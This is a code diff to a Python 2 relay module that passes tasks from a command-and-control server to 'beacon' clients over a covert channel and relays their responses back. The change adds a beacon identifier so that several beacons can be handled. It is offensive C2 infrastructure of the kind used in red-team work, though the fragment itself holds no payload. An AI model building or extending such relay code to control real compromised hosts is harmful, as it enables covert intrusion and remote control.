@@ -30,12 +30,16 @@ def checkForTasks(sock):
 
 
 #def checkForResponse(sock):
-def checkForResponse():
+def checkForResponse(beaconId):
 	"""
-	Check the covert channel for a response from the client
+	Check the covert channel for a response from the client.
+
+	Args:
+		beaconId (str) - Identifier to determine which beacon we're getting
+						 a response from
 	"""
 
-	recvdResponse = commonUtils.retrieveData()
+	recvdResponse = commonUtils.retrieveData(beaconId)
 	if config.debug:
 		if len(recvdResponse) > 1:
 			print (commonUtils.color("Recieved %d bytes from client", status=False, yellow=True)) % (len(recvdResponse))
@@ -58,9 +62,9 @@ def relayResponse(sock, response):
 		print commonUtils.color("Relaying response to c2 server", status=False, yellow=True)
 	commonUtils.sendFrameToC2(sock, response)
 
-def relayTask(task):
+def relayTask(task, beaconId):
 	# Relays a new task from the c2 server to the client
 	# 'task' will be encoded in the 'commonUtils.sendData()' function.
 	if config.debug:
 		print commonUtils.color("Relaying task to client", status=False, yellow=True)
-	commonUtils.sendData(task)
+	commonUtils.sendData(task, beaconId)
